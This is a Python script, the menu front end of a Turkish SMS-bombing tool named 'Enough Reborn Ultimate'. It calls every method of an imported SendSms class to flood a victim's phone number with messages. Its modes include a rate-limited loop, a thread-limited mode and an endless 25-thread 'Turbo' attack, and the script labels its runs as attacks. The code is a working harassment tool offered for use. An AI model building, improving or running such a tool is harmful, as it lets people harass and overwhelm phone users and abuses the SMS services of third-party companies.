from colorama import Fore, Style, init
from time import sleep
from os import system
from sms import SendSms
import threading
from concurrent.futures import ThreadPoolExecutor
import random

init(autoreset=True)

servisler_sms = []
for attribute in dir(SendSms):
    attribute_value = getattr(SendSms, attribute)
    if callable(attribute_value):
        if not attribute.startswith('__') and attribute != "adet":
            servisler_sms.append(attribute)

def logo():
    print(f"""{Fore.LIGHTCYAN_EX}
 ███████╗███╗   ██╗ ██████╗ ██╗   ██╗ ██████╗ ██╗  ██╗
 ██╔════╝████╗  ██║██╔═══██╗██║   ██║██╔════╝ ██║  ██║
 █████╗  ██╔██╗ ██║██║   ██║██║   ██║██║  ███╗███████║
 ██╔══╝  ██║╚██╗██║██║   ██║██║   ██║██║   ██║██╔══██║
 ███████╗██║ ╚████║╚██████╔╝╚██████╔╝╚██████╔╝██║  ██║
 ╚══════╝╚═╝  ╚═══╝ ╚═════╝  ╚═════╝  ╚═════╝ ╚═╝  ╚═╝
                                                      
 ██████╗ ███████╗██████╗  ██████╗ ██████╗ ███╗   ██╗
 ██╔══██╗██╔════╝██╔══██╗██╔═══██╗██╔══██╗████╗  ██║
 ██████╔╝█████╗  ██████╔╝██║   ██║██████╔╝██╔██╗ ██║
 ██╔══██╗██╔══╝  ██╔══██╗██║   ██║██╔══██╗██║╚██╗██║
 ██████╔╝███████╗██║  ██║╚██████╔╝██║  ██║██║ ╚████║
 ╚═════╝ ╚══════╝╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═══╝
    
    {Fore.LIGHTWHITE_EX}Status: {Fore.LIGHTGREEN_EX}{len(servisler_sms)} Services Online {Fore.LIGHTWHITE_EX}| {Fore.LIGHTRED_EX}Enough Reborn Ultimate
    """)

while 1:
    system("cls||clear")
    logo()
    try:
        print(f"{Fore.LIGHTMAGENTA_EX} [1] SMS Gönder (Normal)")
        print(f"{Fore.LIGHTMAGENTA_EX} [2] SMS Gönder (Turbo - Hızlı)")
        print(f"{Fore.LIGHTMAGENTA_EX} [3] SMS Gönder (Thread Limitli)")
        print(f"{Fore.LIGHTMAGENTA_EX} [4] API Modunu Başlat (FastAPI)")
        print(f"{Fore.LIGHTMAGENTA_EX} [5] Çıkış\n")
        menu = input(Fore.LIGHTYELLOW_EX + " Seçiminiz: ")
        if menu == "": continue
        menu = int(menu) 
    except ValueError:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Hatalı giriş yaptın. Tekrar deneyiniz.")
        sleep(2)
        continue

    if menu == 5:
        system("cls||clear")
        print(Fore.LIGHTRED_EX + "Çıkış yapılıyor...")
        break

    if menu == 4:
        system("cls||clear")
        print(Fore.LIGHTGREEN_EX + "API Modu başlatılıyor (FastAPI)...")
        print(Fore.LIGHTYELLOW_EX + "Dosyalar kontrol ediliyor: api.py")
        sleep(1)
        system("python api.py")
        continue

    if menu in [1, 2, 3]:
        system("cls||clear")
        logo()
        print(Fore.LIGHTYELLOW_EX + "Telefon numarasını başında '+90' olmadan yazınız: "+ Fore.LIGHTGREEN_EX, end="")
        tel_no = input()
        if len(tel_no) != 10 or not tel_no.isdigit():
            print(Fore.LIGHTRED_EX + "Hatalı telefon numarası! (Örn: 5551234567)")
            sleep(2)
            continue

        print(Fore.LIGHTYELLOW_EX + "Mail adresi (Boş bırakmak için 'enter'): "+ Fore.LIGHTGREEN_EX, end="")
        mail = input()
        
        kere = 1
        if menu != 2:
            print(Fore.LIGHTYELLOW_EX + "Kaç adet SMS göndermek istiyorsunuz: "+ Fore.LIGHTGREEN_EX, end="")
            try:
                kere = int(input())
            except: kere = 1

        aralik = 0
        if menu == 1:
            print(Fore.LIGHTYELLOW_EX + "Kaç saniye aralıkla (Örn: 1): "+ Fore.LIGHTGREEN_EX, end="")
            try:
                aralik = int(input())
            except: aralik = 1

        system("cls||clear")
        logo()
        print(Fore.LIGHTCYAN_EX + f"[*] Saldırı Başlatıldı: {tel_no}")
        sms = SendSms(tel_no, mail)

        if menu == 1: # Normal
            total_sent = 0
            while total_sent < kere:
                for service in servisler_sms:
                    if total_sent >= kere: break
                    getattr(sms, service)()
                    total_sent += 1
                    sleep(aralik)
        
        elif menu == 2: # Turbo
            print(Fore.LIGHTRED_EX + "[!] Turbo Mod Aktif! Durdurmak için Ctrl+C")
            try:
                def work(srv):
                    try: getattr(sms, srv)()
                    except: pass
                
                with ThreadPoolExecutor(max_workers=25) as executor:
                    while True:
                        random.shuffle(servisler_sms)
                        # list() kullanarak her servisin bitmesini bekliyoruz, yoksa RAM dolar ve çöker.
                        list(executor.map(work, servisler_sms))
                        sleep(0.5) # Sistemi yormamak için kısa bir ara
            except KeyboardInterrupt:
                print(Fore.LIGHTYELLOW_EX + "\n[!] Saldırı Durduruldu.")
                sleep(2)

        elif menu == 3: # Thread Limitli
            print(Fore.LIGHTYELLOW_EX + "Max Thread Sayısı (Örn: 5): "+ Fore.LIGHTGREEN_EX, end="")
            try:
                workers = int(input())
            except: workers = 5
            
            state = {'sent': 0}
            def work(srv):
                if state['sent'] < kere:
                    getattr(sms, srv)()
                    state['sent'] += 1

            with ThreadPoolExecutor(max_workers=workers) as executor:
                while state['sent'] < kere:
                    random.shuffle(servisler_sms)
                    list(executor.map(work, servisler_sms))

        print(Fore.LIGHTGREEN_EX + "\nİşlem Tamamlandı. Menüye dönmek için 'enter' basın.")
        input()